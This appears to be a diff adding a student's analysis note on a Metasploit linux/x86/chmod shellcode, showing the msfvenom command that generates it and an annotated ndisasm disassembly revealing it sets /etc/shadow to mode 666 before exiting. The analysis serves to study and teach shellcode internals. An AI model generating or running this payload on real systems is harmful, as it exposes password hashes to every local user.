@@ -1,0 +1,42 @@
+paul@SLAE001:~$ msfvenom  -p linux/x86/chmod -o linux-x86-chmod.bin -f raw
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 36 bytes
+Saved as: linux-x86-chmod.bin
+paul@SLAE001:~$ ndisasm -p intel linux-x86-chmod.bin
+00000000  99                cwd			<-- convert word to double, puts the MSB of ax across all bits of dx, maybe assumes a 0
+00000001  6A0F              push byte +0xf	<-- push 0xf
+00000003  58                pop ax		<-- pop 0xf into ax, decimal 15
+00000004  52                push dx		<-- push dx (null if MSB of ax was 0)
+00000005  E80C00            call word 0x14	<-- save return address, jump to 0x16
+
+Bet the following is a string...  Yup, it's '\0\0/etc/shadow'
+00000008  0000              add [bx+si],al	<-- null padding
+0000000A  2F                das			<--------------  String between 0xa and 0x14 
+0000000B  657463            gs jz 0x71
+0000000E  2F                das
+0000000F  7368              jnc 0x79
+00000011  61                popaw
+00000012  646F              fs outsw
+00000014  7700              ja 0x16		<--------------  String between 0xa and 0x14 
+
+00000016  5B                pop bx		<-- pop return address into cx (points to start of string at 0xa)
+00000017  68B601            push word 0x1b6	<-- push 0x000001b6, octal 666
+0000001A  0000              add [bx+si],al	<-- another opcode 0x68 misinterpretation, ignore this 
+0000001C  59                pop cx		<-- pop octal 666 into cx
+0000001D  CD80              int 0x80		<-- invoke system call 15, chmod('/etc/shadow', 666)
+
+0000001F  6A01              push byte +0x1	<-- push 1
+00000021  58                pop ax		<-- pop 1 into ax
+00000022  CD80              int 0x80		<-- invoke system call 1, exit()
+
+
+In summary;
+invoke system call 15, chmod('/etc/shadow', 666)
+invoke system call 1, exit()
+
+There are a few things to note about this shellcode - if when it begins the MSB of the ax register isnt 0, chances are it won't work as expected.
+Also, no setreuid call means that modern kernels which drop privs will likely break this shellcode.
+
+
